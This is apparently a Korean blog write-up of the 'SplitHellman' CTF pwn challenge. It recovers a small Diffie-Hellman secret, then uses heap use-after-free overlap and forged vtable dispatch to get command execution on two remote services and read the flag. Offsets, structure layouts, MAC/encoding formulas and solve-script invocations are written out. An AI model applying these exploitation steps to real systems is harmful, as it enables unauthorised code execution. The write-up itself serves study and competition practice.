---
title: "[Hypersonic CTF] SplitHellman Writeup"
date: 2026-06-09 00:00:00 +0900
categories: [ctf, pwn]
tags: [writeup, pwn, crypto, dh]
ctf_event: "Hypersonic CTF (2026.06.07)"
challenge: "SplitHellman"
challenge_category: pwn
toc: true
comments: false
---

## TL;DR

- Alice와 Bob은 같은 형태의 커스텀 Diffie-Hellman 기반 암호화 프로토콜을 사용한다.
- Bob은 작은 DH 파라미터와 32-bit secret 때문에 서버 DH secret을 복구할 수 있고, 이후 heap UAF/overlap으로 audit callback을 `system` 경로로 돌려 RCE를 얻는다.
- Alice도 DH secret 복구 후, zero-size object와 route forwarding을 이용해 다음 chunk의 metadata/object를 덮고 forged vtable dispatch로 RCE를 얻는다.
- 최종 플래그:

```text
HS{alice_and_bob_agreed_on_a_secret_but_forgot_to_check_the_subgroup}
```

## Challenge Files

```text
for_user/for_user/
|-- alice
|-- bob
|-- libc.so.6
|-- ld-linux-x86-64.so.2
`-- README.md
```

원격 서비스는 Alice/Bob이 분리되어 있었다.

```text
Alice: 15.165.245.192:23137
Bob:   15.165.245.192:23138
```

## 공통 프로토콜 분석

두 바이너리는 handshake 이후 모든 명령을 암호화된 packet으로 주고받는다.

```text
<nonce> <len> <hex(ciphertext)> <mac64>
```

핵심은 서버 public key `B = g^x mod p`에서 서버 secret `x`를 구할 수 있다는 점이다. Bob 기준 DH prime은 다음처럼 매우 작다.

```text
p = 0x5d64ac6d25
g = 2
```

또 서버 exponent가 32-bit 범위라 baby-step giant-step으로 빠르게 discrete log를 풀 수 있다. 서버 secret을 복구하면 shared secret을 계산하고, 세션 nonce와 함께 enc/mac/object key를 그대로 파생할 수 있다.

이후에는 평문 명령을 만들고 커스텀 stream XOR + MAC으로 감싸서 서비스와 통신했다.

## Bob Exploit

### 취약점

Bob 쪽 command set에는 note 기능이 있다.

```text
NEW idx size
EDIT idx len hex
SHOW idx
DEL idx mode
CLOSE
RESUME slot
INFO
FLUSH
```

중요한 버그는 다음 조합이다.

1. `EDIT`는 입력 길이를 `0x1000` 이하로만 제한하고, note allocation size와 비교하지 않는다.
2. `DEL idx 1`은 `note->data`만 free하고 note object와 dangling pointer를 남긴다.
3. `CLOSE`/`RESUME` 과정에서 freed session/note 구조가 다시 겹치며, note data와 session 구조체를 overlap시킬 수 있다.
4. `FLUSH`는 session 내부 audit record의 function pointer를 검증 후 호출한다.

### Leak

`INFO`로 PIE/libc/object key 계열 정보를 얻고, `SHOW 0`으로 overlapped session bytes를 읽어 note pointer를 확인했다.

원격 Bob은 로컬과 callback offset이 조금 달랐다. fake note를 이용한 arbitrary read로 원격 `.data`를 훑어 실제 audit callback pointer가 로컬 대비 `+0x18`인 것을 확인했다.

```text
local callback:  base + 0x1356
remote callback: base + 0x136e
adjust:          +0x18
```

### RCE

overlapped session 안에 fake audit record를 구성했다.

```text
session magic @ +0x50 = 0x52534d45
note slot     @ +0x58 = real_note_ptr
audit record:
  +0x00 auth
  +0x08 function pointer
  +0x10 command string
```

그 후 `FLUSH`를 호출하면 audit callback 경유로 command가 실행된다.

검증:

```bash
python3 solve.py 15.165.245.192 23138 -c id --method binary --func-adjust 0x18
```

Bob flag read:

```bash
python3 solve.py 15.165.245.192 23138 \
  -c '/bin/cat /home/bob/flag' \
  --method binary \
  --func-adjust 0x18
```

결과 suffix:

```text
but_forgot_to_check_the_subgroup}
```

## Alice Exploit

### 취약점

Alice는 object/class/type 기반 dispatcher를 사용한다.

```text
NEW idx id class type size hex
REGISTER reg obj
DISPATCH idx
DROP idx
INFO
```

object 구조는 대략 다음 형태다.

```c
struct object {
    uint64_t id;
    uint32_t type;
    uint32_t size;
    uint64_t auth;
    uint64_t encoded_ops;
    uint8_t data[];
};
```

`REGISTER`는 object 자체가 아니라 `obj + 0x20`, 즉 data pointer를 route table에 저장한다. 문제는 `size = 0`인 object를 만들 수 있다는 점이다. 이 경우 data pointer가 chunk user area 바로 뒤를 가리키고, 다음 allocation이 붙으면 다음 chunk header 위치를 가리키게 된다.

즉, zero-size object A를 만들고 바로 뒤에 object B를 배치하면:

```text
A.data == B_chunk_header
```

route forwarding으로 A의 registered data pointer에 쓰면 B의 chunk header와 object metadata를 덮을 수 있다.

### Leak

`INFO`는 regular vtable pointer와 object key를 leak한다.

```text
regular_vtable leak
obj_key leak = printed_key ^ 0xabad1dea
system_vtable = regular_vtable - 0x10
```

type3 object의 dispatch 출력으로 B object pointer도 leak했다.

### Forgery

B 앞 chunk header부터 forged bytes를 쓴다.

```text
chunk prev_size = 0
chunk size      = 0xb1
B.id/type/size  = command bytes 일부
B.auth          = mac64(obj_key, metadata)
B.encoded_ops   = encode(system_vtable)
```

auth 계산은 object address까지 포함한다.

```text
auth = mac64(obj_key, p64(id) + p64(type) + p64(size) + p64(ops) + p64(obj_addr))
ops  = rol(ptr ^ obj_key ^ 0x0b1ec7ed0b1ec7ed, 17)
```

명령 문자열은 object 첫 16 bytes에 들어가야 하므로, 원격에서는 짧은 glob과 shell comment를 사용했다.

```text
cat /h*/*/flag #
```

`#` 뒤로 붙는 auth/ops binary bytes는 shell comment로 무시된다.

### RCE

흐름은 다음과 같다.

1. class1/type1 logger object로 global log buffer를 forged payload로 세팅한다.
2. class2/type2 route object를 만들고 `route_ptr = B - 0x10`, `len = forged_len`으로 둔다.
3. route object를 dispatch해서 forged bytes를 B 위치에 쓴다.
4. B를 dispatch하면 forged ops가 system wrapper vtable을 가리켜 command가 실행된다.

검증:

```bash
python3 solve_alice.py 15.165.245.192 23137 -c 'cat /h*/*/flag #'
```

결과 prefix:

```text
HS{alice_and_bob_agreed_on_a_secret_
```

## 최종 플래그 조합

Alice에서 prefix, Bob에서 suffix를 얻어 합치면 최종 플래그가 된다.

```text
HS{alice_and_bob_agreed_on_a_secret_but_forgot_to_check_the_subgroup}
```

## Exploit Scripts

- `solve.py`: Bob exploit. DH secret recovery, encrypted protocol, heap overlap, audit callback RCE.
- `solve_alice.py`: Alice exploit. DH secret recovery, object key/vtable leak, zero-size object route overwrite, forged dispatch RCE.

실행 예시는 다음과 같다.

```bash
# Alice
python3 solve_alice.py 15.165.245.192 23137 -c 'cat /h*/*/flag #'

# Bob
python3 solve.py 15.165.245.192 23138 \
  -c '/bin/cat /home/bob/flag' \
  --method binary \
  --func-adjust 0x18
```
